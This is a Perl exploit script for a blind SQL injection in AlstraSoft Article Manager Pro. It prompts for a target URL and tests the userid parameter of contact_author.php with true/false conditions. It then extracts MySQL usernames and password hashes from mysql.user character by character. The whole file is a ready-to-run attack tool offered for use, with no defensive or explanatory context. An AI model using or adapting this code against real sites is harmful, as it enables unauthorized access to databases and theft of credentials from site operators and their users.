#/usr/bin/perl
#|+| Author: GoLd_M
#--//-->
# -- AlstraSoft Article Manager Pro  Blind SQL Injection Exploit --
#--//--> Exploit :
use strict;
use LWP::Simple;

print "-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-\n";
print "-    AlstraSoft Article Manager Pro  Blind SQL Injection Exploit   -\n";
print "                     GoLd_M Mahmood_ali Tryag.cc/cc                 \n";
print "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-\n";

print "\nEnter URL (ie: http://server.com): ";
	chomp(my $url=<STDIN>);
	
if(inject_test($url)) {
	print "Injecting.. Please Wait this could take several minutes..\n\n";
	my $details = blind($url);
	print "Exploit Success! Admin Details: ".$details;
	exit;
}

sub blind {

	my $url    = shift;
	my $res    = undef;
	my $chr    = 48;
	my $substr = 1;
	my $done   = 1;
	
	while($done) {
		my $content = get($url."/contact_author.php?userid=1)  and ascii(substring((SELECT CONCAT(username,0x3a,password,0x5E) FROM 
mysql.user),".$substr.",1))=".$chr."/*");
		
		if($content =~ /Previous/ && $chr == 94) { $done = 0; }
			elsif($content =~ /Previous/) { $res .= chr($chr); $substr++; $chr = 48; }
				else { $chr++; }
	}
	return $res;
}

sub inject_test {

	my $url     = shift;
	my $true    = get($url."/contact_author.php?userid=1) and 1=1 /*");
	my $false   = get($url."/contact_author.php?userid=1) and 1=2 /*");
	
	if($true =~ /Previous/ && $false !~ /Previous/) {
		print "\nTarget Site Vulnerable!\n\n";
		return 1;
	} else { print "\nTarget Site Not Vulnerable! Exiting..\n"; exit; }
}
